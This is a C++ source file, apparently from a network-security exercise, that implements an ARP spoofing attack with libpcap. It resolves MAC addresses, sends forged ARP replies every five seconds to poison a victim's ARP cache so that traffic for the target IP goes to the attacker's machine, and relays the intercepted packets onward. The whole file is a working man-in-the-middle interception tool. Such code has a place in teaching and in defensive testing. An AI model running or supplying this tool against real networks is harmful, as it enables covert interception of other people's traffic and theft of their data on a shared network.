#include "arp-spoof.h"
#include <iostream>
#include <unistd.h>
#include <cstring>
#include <sys/ioctl.h>
#include <net/if.h>
#include <arpa/inet.h>

bool getMyInfo(const char* dev) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return false;

    struct ifreq ifr;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);

    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) return false;
    myMac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) return false;
    myIp = Ip(ntohl(((sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));

    close(sock);
    return true;
}

bool getMac(pcap_t* pcap, Mac& mac, Ip ip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(myIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(ip);

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(pcap, &header, &recv_packet);
        if (res <= 0) continue;

        EthHdr* eth = (EthHdr*)recv_packet;
        if (ntohs(eth->type_) != EthHdr::Arp) continue;
        ArpHdr* arp = (ArpHdr*)(recv_packet + sizeof(EthHdr));
        if (ntohs(arp->op_) != ArpHdr::Reply) continue;
        if (arp->sip_ != ip) continue;

        mac = arp->smac_;
        return true;
    }
    return false;
}

bool sendArpSpoof(const SpoofPair& pair) {
    EthArpPacket packet;
    packet.eth_.dmac_ = pair.senderMac;
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(pair.targetIp);
    packet.arp_.tmac_ = pair.senderMac;
    packet.arp_.tip_ = htonl(pair.senderIp);

    return pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet)) == 0;
}

void* spoofThread(void* arg) {
    FlowContext* ctx = (FlowContext*)arg;
    while (true) {
        sendArpSpoof(ctx->spoofpair);
        sleep(5);
    }
    return nullptr;
}

void* relayThread(void* arg) {
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res <= 0) continue;

        EthHdr* eth = (EthHdr*)packet;
        for (const auto& pair : spoofpairs) {
            if (eth->smac_ == pair.senderMac && eth->dmac_ == myMac) {
                u_char* relay_packet = (u_char*)malloc(header->caplen);
                memcpy(relay_packet, packet, header->caplen);
                EthHdr* newEth = (EthHdr*)relay_packet;
                newEth->smac_ = myMac;
                newEth->dmac_ = pair.targetMac;
                pcap_sendpacket(pcap, relay_packet, header->caplen);
                free(relay_packet);
                break;
            }
        }
    }
    return nullptr;
}
